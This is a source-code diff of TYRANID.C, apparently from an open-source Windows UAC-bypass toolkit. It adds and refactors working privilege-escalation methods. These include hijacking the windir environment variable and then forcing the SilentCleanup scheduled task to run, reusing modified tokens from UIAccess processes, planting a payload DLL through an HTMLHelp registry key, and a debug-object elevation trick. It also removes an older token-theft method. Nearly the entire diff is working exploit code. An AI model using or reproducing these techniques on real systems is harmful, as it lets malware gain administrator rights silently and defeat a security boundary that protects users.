@@ -4,9 +4,9 @@
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     3.23
+*  VERSION:     3.54
 *
-*  DATE:        17 Dec 2019
+*  DATE:        24 Nov 2020
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -26,6 +26,93 @@
 *
 *******************************************************************************/
 #include "global.h"
+
+/*
+* ucmxStartTask
+*
+* Purpose:
+*
+* Run target task as schtasks does.
+*
+*/
+BOOLEAN ucmxStartTask()
+{
+    HRESULT hr_init, hr = E_FAIL;
+    ITaskService* pService = NULL;
+    ITaskFolder* pRootFolder = NULL;
+    IRegisteredTask* pTask = NULL;
+    IRunningTask* pRunningTask = NULL;
+    VARIANT var;
+
+    BSTR bstrTaskFolder = NULL;
+    BSTR bstrTask = NULL;
+
+    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    do {
+
+        bstrTaskFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
+        if (bstrTaskFolder == NULL)
+            break;
+
+        bstrTask = SysAllocString(L"SilentCleanup");
+        if (bstrTask == NULL)
+            break;
+
+        hr = CoCreateInstance(&CLSID_TaskScheduler,
+            NULL,
+            CLSCTX_INPROC_SERVER,
+            &IID_ITaskService,
+            (void**)&pService);
+
+        if (FAILED(hr))
+            break;
+
+        var.vt = VT_NULL;
+
+        hr = pService->lpVtbl->Connect(pService, var, var, var, var);
+        if (FAILED(hr))
+            break;
+
+        hr = pService->lpVtbl->GetFolder(pService, bstrTaskFolder, &pRootFolder);
+        if (FAILED(hr))
+            break;
+
+        hr = pRootFolder->lpVtbl->GetTask(pRootFolder, bstrTask, &pTask);
+        if (FAILED(hr))
+            break;
+
+        hr = pTask->lpVtbl->RunEx(pTask, var, TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, &pRunningTask);
+        if (FAILED(hr))
+            break;
+
+    } while (FALSE);
+
+    if (bstrTaskFolder)
+        SysFreeString(bstrTaskFolder);
+
+    if (bstrTask)
+        SysFreeString(bstrTask);
+
+    if (pRunningTask) {
+        pRunningTask->lpVtbl->Stop(pRunningTask);
+        pRunningTask->lpVtbl->Release(pRunningTask);
+    }
+
+    if (pTask)
+        pTask->lpVtbl->Release(pTask);
+
+    if (pRootFolder)
+        pRootFolder->lpVtbl->Release(pRootFolder);
+
+    if (pService)
+        pService->lpVtbl->Release(pService);
+
+    if (SUCCEEDED(hr_init))
+        CoUninitialize();
+
+    return SUCCEEDED(hr);
+}
 
 /*
 * ucmDiskCleanupEnvironmentVariable
@@ -60,265 +147,23 @@ NTSTATUS ucmDiskCleanupEnvironmentVariable(
         //
         // Set our controlled env.variable with payload.
         //
-        if (!supSetEnvVariable(FALSE, NULL, T_WINDIR, szEnvVariable))
+        if (!supSetEnvVariableEx(FALSE, NULL, T_WINDIR, szEnvVariable))
             break;
 
         //
         // Run trigger task.
         //
-        if (supRunProcess(SCHTASKS_EXE, T_SCHTASKS_CMD))
+        if (ucmxStartTask())
             MethodResult = STATUS_SUCCESS;
 
         //
         // Cleaup our env.variable.
         //
-        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
+        supSetEnvVariableEx(TRUE, NULL, T_WINDIR, NULL);
 
     } while (FALSE);
 
     return MethodResult;
-}
-
-/*
-* ucmTokenModification
-*
-* Purpose:
-*
-* Obtains the token from an auto-elevated process, modifies it, and reuses it to execute as administrator.
-*
-* Fixed in Windows 10 RS5
-*
-*/
-NTSTATUS ucmTokenModification(
-    _In_ LPWSTR lpszPayload,
-    _In_ BOOL fUseCommandLine
-)
-{
-    BOOL bSelfRun = FALSE;
-    ULONG dummy;
-    NTSTATUS Status = STATUS_ACCESS_DENIED;
-    HANDLE hTargetProcess = NULL;
-    HANDLE hProcessToken = NULL, hDupToken = NULL, hLuaToken = NULL, hImpToken = NULL;
-
-    LPWSTR lpApplicationName, lpCommandLine;
-    PSYSTEM_PROCESSES_INFORMATION ProcessList, pList;
-
-    SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
-    PSID pIntegritySid = NULL;
-    TOKEN_MANDATORY_LABEL tml;
-    SECURITY_QUALITY_OF_SERVICE sqos;
-    OBJECT_ATTRIBUTES obja;
-    CLIENT_ID cid;
-
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    SHELLEXECUTEINFO shinfo;
-
-    TOKEN_ELEVATION tei;
-
-    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
-
-    do {
-
-        hTargetProcess = NULL;
-
-        //
-        // Attempt to locate already elevated process running in the system.
-        //
-        InitializeObjectAttributes(&obja, NULL, 0, 0, NULL);
-        ProcessList = (PSYSTEM_PROCESSES_INFORMATION)supGetSystemInfo(SystemProcessInformation);
-        if (ProcessList) {
-            pList = ProcessList;
-            for (;;) {
-                cid.UniqueProcess = pList->UniqueProcessId;
-                cid.UniqueThread = NULL;
-
-                //
-                // Open process and query it process token elevation state.
-                //
-                Status = NtOpenProcess(&hTargetProcess, MAXIMUM_ALLOWED, &obja, &cid);
-                if (NT_SUCCESS(Status)) {
-                    Status = NtOpenProcessToken(hTargetProcess, MAXIMUM_ALLOWED, &hProcessToken);
-                    if (NT_SUCCESS(Status)) {
-                        tei.TokenIsElevated = 0;
-                        Status = NtQueryInformationToken(hProcessToken,
-                            TokenElevation, &tei,
-                            sizeof(TOKEN_ELEVATION), &dummy);
-                        if (NT_SUCCESS(Status)) {
-                            //
-                            // Elevated process found, don't close it handles as we will re-use them next.
-                            //
-                            if (tei.TokenIsElevated > 0) {
-                                break;
-                            }
-                        }
-                        NtClose(hProcessToken);
-                        hProcessToken = NULL;
-                    }
-                    NtClose(hTargetProcess);
-                    hTargetProcess = NULL;
-                }
-
-                if (pList->NextEntryDelta == 0)
-                    break;
-
-                pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
-            }
-            supHeapFree(ProcessList);
-        }
-
-        //
-        // If not found then run it.
-        //
-        if (hTargetProcess == NULL) {
-
-            //
-            // Run autoelevated app (any).
-            //
-            shinfo.cbSize = sizeof(shinfo);
-            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-            shinfo.lpFile = WUSA_EXE;
-            shinfo.nShow = SW_HIDE;
-            if (!ShellExecuteEx(&shinfo)) {
-                break;
-            }
-            else {
-                bSelfRun = TRUE;
-                hTargetProcess = shinfo.hProcess;
-            }
-        }
-
-        //
-        // Open token of elevated process.
-        //
-        if (hProcessToken == NULL) {
-            Status = NtOpenProcessToken(hTargetProcess, MAXIMUM_ALLOWED, &hProcessToken);
-            if (!NT_SUCCESS(Status))
-                break;
-        }
-
-        //
-        // Duplicate primary token.
-        //
-        sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
-        sqos.ImpersonationLevel = SecurityImpersonation;
-        sqos.ContextTrackingMode = 0;
-        sqos.EffectiveOnly = FALSE;
-        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
-        obja.SecurityQualityOfService = &sqos;
-        Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
-        if (!NT_SUCCESS(Status))
-            break;
-
-        //
-        // Lower duplicated token IL from High to Medium.
-        //
-        Status = RtlAllocateAndInitializeSid(&MLAuthority,
-            1, SECURITY_MANDATORY_MEDIUM_RID,
-            0, 0, 0, 0, 0, 0, 0,
-            &pIntegritySid);
-        if (!NT_SUCCESS(Status))
-            break;
-
-        tml.Label.Attributes = SE_GROUP_INTEGRITY;
-        tml.Label.Sid = pIntegritySid;
-
-        Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
-            (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
-        if (!NT_SUCCESS(Status))
-            break;
-
-        //
-        // Create restricted token.
-        //
-        Status = NtFilterToken(hDupToken, LUA_TOKEN, NULL, NULL, NULL, &hLuaToken);
-        if (!NT_SUCCESS(Status))
-            break;
-
-        //
-        // Impersonate logged on user.
-        //
-        hImpToken = NULL;
-        Status = NtDuplicateToken(hLuaToken, TOKEN_IMPERSONATE | TOKEN_QUERY,
-            &obja,
-            FALSE,
-            TokenImpersonation,
-            &hImpToken);
-        if (!NT_SUCCESS(Status))
-            break;
-
-        Status = NtSetInformationThread(
-            NtCurrentThread(),
-            ThreadImpersonationToken,
-            &hImpToken,
-            sizeof(HANDLE));
-
-        if (!NT_SUCCESS(Status))
-            break;
-
-        NtClose(hImpToken);
-        hImpToken = NULL;
-
-        //
-        // Run target.
-        //
-        RtlSecureZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        GetStartupInfo(&si);
-
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_SHOW;
-
-        RtlSecureZeroMemory(&pi, sizeof(pi));
-
-        if (fUseCommandLine) {
-            lpApplicationName = NULL;
-            lpCommandLine = lpszPayload;
-        }
-        else {
-            lpApplicationName = lpszPayload;
-            lpCommandLine = NULL;
-        }
-
-        if (CreateProcessWithLogonW(TEXT("uac"), TEXT("is"), TEXT("useless"),
-            LOGON_NETCREDENTIALS_ONLY,
-            lpApplicationName,
-            lpCommandLine,
-            0,
-            NULL,
-            NULL,
-            &si,
-            &pi))
-        {
-            if (pi.hThread) CloseHandle(pi.hThread);
-            if (pi.hProcess) CloseHandle(pi.hProcess);
-            Status = STATUS_SUCCESS;
-        }
-
-        //
-        // Revert to self.
-        //
-        hImpToken = NULL;
-        NtSetInformationThread(
-            NtCurrentThread(),
-            ThreadImpersonationToken,
-            (PVOID)&hImpToken,
-            sizeof(HANDLE));
-
-    } while (FALSE);
-
-    if (hImpToken) NtClose(hImpToken);
-    if (hProcessToken) NtClose(hProcessToken);
-    if (hDupToken) NtClose(hDupToken);
-    if (hLuaToken) NtClose(hLuaToken);
-
-    if (bSelfRun) {
-        NtTerminateProcess(hTargetProcess, STATUS_SUCCESS);
-    }
-    if (hTargetProcess) NtClose(hTargetProcess);
-    if (pIntegritySid) RtlFreeSid(pIntegritySid);
-
-    return Status;
 }
 
 /*
@@ -331,59 +176,49 @@ NTSTATUS ucmTokenModification(
 */
 BOOL ucmxTokenModUIAccessMethodInitPhase(
     _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
+    _In_ DWORD ProxyDllSize,
+    _In_ LPCSTR EntryPointName,
+    _In_ LPCWSTR PayloadFileName
 )
 {
     BOOL bResult = FALSE;
 
     WCHAR szBuffer[MAX_PATH * 2];
 
-    do {
-
+    //
+    // Patch Fubuki to the new entry point and convert to EXE
+    //
+    if (supReplaceDllEntryPoint(ProxyDll,
+        ProxyDllSize,
+        EntryPointName,
+        TRUE))
+    {
         //
-        // Patch Fubuki to the new entry point and convert to EXE
-        //
-        if (!supReplaceDllEntryPoint(ProxyDll,
-            ProxyDllSize,
-            FUBUKI_ENTRYPOINT_UIACCESS2,
-            TRUE))
-        {
-            break;
-        }
-
-        //
-        // Drop modified Fubuki.exe to the %temp%
+        // Drop modified Fubuki to the %temp%
         //
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, g_ctx->szTempDirectory);
-        _strcat(szBuffer, FUBUKI_EXE);
-        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
-            break;
-
-        bResult = TRUE;
-
-    } while (FALSE);
-
-    if (bResult == FALSE) {
-        _strcpy(szBuffer, g_ctx->szTempDirectory);
-        _strcat(szBuffer, FUBUKI_EXE);
-        DeleteFile(szBuffer);
+        _strcat(szBuffer, PayloadFileName);
+        bResult = supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize);
     }
 
     return bResult;
 }
 
 /*
-* ucmTokenModUIAccessMethod
+* ucmxTokenModUIAccessExec
 *
 * Purpose:
 *
 * Obtain token from UIAccess application, modify it and reuse for UAC bypass.
 *
 */
-NTSTATUS ucmTokenModUIAccessMethod(
+NTSTATUS ucmxTokenModUIAccessExec(
     _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
+    _In_ DWORD ProxyDllSize,
+    _In_ LPCSTR EntryPointName,
+    _In_ LPCWSTR PayloadFileName,
+    _In_ UCM_METHOD Method
 )
 {
     NTSTATUS Status = STATUS_ACCESS_DENIED;
@@ -406,8 +241,13 @@ NTSTATUS ucmTokenModUIAccessMethod(
         //
         // Tweak and drop payload to %temp%.
         //
-        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll, ProxyDllSize))
+        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll,
+            ProxyDllSize,
+            EntryPointName,
+            PayloadFileName))
+        {
             break;
+        }
 
         //
         // Spawn OSK.exe process.
@@ -476,12 +316,14 @@ NTSTATUS ucmTokenModUIAccessMethod(
         // Run second stage exe to perform some gui hacks.
         //
         _strcpy(szBuffer, g_ctx->szTempDirectory);
-        _strcat(szBuffer, FUBUKI_EXE);
+        _strcat(szBuffer, PKGMGR_EXE);
 
-        if (g_ctx->OptionalParameterLength == 0)
-            lpszPayload = g_ctx->szDefaultPayload;
-        else
-            lpszPayload = g_ctx->szOptionalParameter;
+        if (Method == UacMethodTokenModUiAccess) {
+            if (g_ctx->OptionalParameterLength == 0)
+                lpszPayload = g_ctx->szDefaultPayload;
+            else
+                lpszPayload = g_ctx->szOptionalParameter;
+        }
 
         if (CreateProcessAsUser(hDupToken,
             szBuffer,    //application
@@ -516,9 +358,84 @@ NTSTATUS ucmTokenModUIAccessMethod(
     if (pIntegritySid) RtlFreeSid(pIntegritySid);
 
     _strcpy(szBuffer, g_ctx->szTempDirectory);
-    _strcat(szBuffer, FUBUKI_EXE);
+    _strcat(szBuffer, PayloadFileName);
     DeleteFile(szBuffer);
 
+    return Status;
+}
+
+/*
+* ucmTokenModUIAccessMethod
+*
+* Purpose:
+*
+* Obtain token from UIAccess application, modify it and reuse for UAC bypass.
+*
+*/
+NTSTATUS ucmTokenModUIAccessMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    return ucmxTokenModUIAccessExec(ProxyDll, ProxyDllSize,
+        FUBUKI_ENTRYPOINT_UIACCESS2, PKGMGR_EXE,
+        UacMethodTokenModUiAccess);
+}
+
+/*
+* ucmTokenModUIAccessMethod2
+*
+* Purpose:
+*
+* Variant inspired by Stefan Kanthak findings. Based on same tyranid UIAccess bypass.
+*
+*/
+NTSTATUS ucmTokenModUIAccessMethod2(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    HKEY hKey;
+    LRESULT lResult;
+    NTSTATUS Status = STATUS_ACCESS_DENIED;
+    SIZE_T sz;
+    WCHAR szPayload[MAX_PATH * 2];
+
+    _strcpy(szPayload, g_ctx->szTempDirectory);
+    _strcat(szPayload, THEOLDNEWTHING);
+    _strcat(szPayload, TEXT(".dll"));
+
+    if (supWriteBufferToFile(szPayload, ProxyDll, ProxyDllSize)) {
+
+        hKey = NULL;
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, T_HTMLHELP_AUTHOR, 0, NULL,
+            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
+        if (lResult == ERROR_SUCCESS) {
+
+            sz = (1 + _strlen(szPayload)) * sizeof(WCHAR);
+            lResult = RegSetValueEx(hKey,
+                T_LOCATION,
+                0,
+                REG_SZ,
+                (BYTE*)szPayload,
+                (DWORD)sz);
+
+            if (lResult == ERROR_SUCCESS) {
+
+                Status = ucmxTokenModUIAccessExec(ProxyDll,
+                    ProxyDllSize,
+                    FUBUKI_ENTRYPOINT_UIACCESS3,
+                    PKGMGR_EXE,
+                    UacMethodTokenModUiAccess2);
+
+            }
+
+            RegCloseKey(hKey);
+        }
+
+        RegDeleteKey(HKEY_CURRENT_USER, T_HTMLHELP_AUTHOR);
+        DeleteFile(szPayload);
+    }
     return Status;
 }
 
@@ -646,8 +563,12 @@ NTSTATUS ucmDebugObjectMethod(
         status = supGetProcessDebugObject(procInfo.hProcess,
             &dbgHandle);
 
-        if (!NT_SUCCESS(status))
+        if (!NT_SUCCESS(status)) {
+            TerminateProcess(procInfo.hProcess, 0);
+            CloseHandle(procInfo.hThread);
+            CloseHandle(procInfo.hProcess);
             break;
+        }
 
         //
         // Detach debug and kill non elevated victim process.
@@ -663,7 +584,7 @@ NTSTATUS ucmDebugObjectMethod(
         // Spawn elevated victim under debug.
         //
         _strcpy(szProcess, g_ctx->szSystemDirectory);
-        _strcat(szProcess, TASKMGR_EXE);
+        _strcat(szProcess, COMPUTERDEFAULTS_EXE);
         RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
         RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));
 
@@ -756,6 +677,6 @@ NTSTATUS ucmDebugObjectMethod(
     } while (FALSE);
 
     if (dbgHandle) NtClose(dbgHandle);
-    SetEvent(g_ctx->SharedContext.hCompletionEvent);
+    supSetGlobalCompletionEvent();
     return status;
 }
